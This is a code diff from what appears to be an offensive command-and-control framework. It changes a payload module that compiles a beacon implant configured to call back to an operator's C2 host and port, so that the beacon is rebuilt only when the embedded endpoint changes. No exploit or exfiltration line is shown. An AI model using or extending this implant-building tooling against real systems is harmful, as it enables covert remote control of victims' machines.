@@ -315,20 +315,17 @@ class PayloadModule(BaseModule):
         notifier.info(f"C2 callback: {c2_host}:{c2_port}")
         try:
             from phantom.utils.builder import generate_dropper, compile_beacon
-            from phantom.utils.c2_crypto import write_beacon_c2_config
+            from phantom.utils.c2_crypto import beacon_config_endpoint
             import phantom
             beacon_dir = os.path.join(os.path.dirname(phantom.__file__),
                                       "payloads", "beacon")
-            cfg_path = os.path.join(beacon_dir, "src", "c2_config.h")
-            current = ""
-            if os.path.exists(cfg_path):
-                with open(cfg_path, "r", encoding="utf-8") as f:
-                    current = f.read()
-            desired = write_beacon_c2_config(
-                beacon_dir, host=c2_host, port=c2_port, use_ssl=True)
+            # rebuild only when the embedded ENDPOINT changed (comparing the
+            # whole generated header always differed, forcing a full
+            # recompile on every build)
             binary = compile_beacon(
                 platform, os.path.dirname(phantom.__file__),
-                force_rebuild=(desired != current), arch=arch,
+                force_rebuild=(beacon_config_endpoint(beacon_dir)
+                               != (c2_host, c2_port)), arch=arch,
                 host=c2_host, port=c2_port, use_ssl=True)
             if not binary:
                 notifier.error("Beacon build failed (cross-toolchain missing?)")
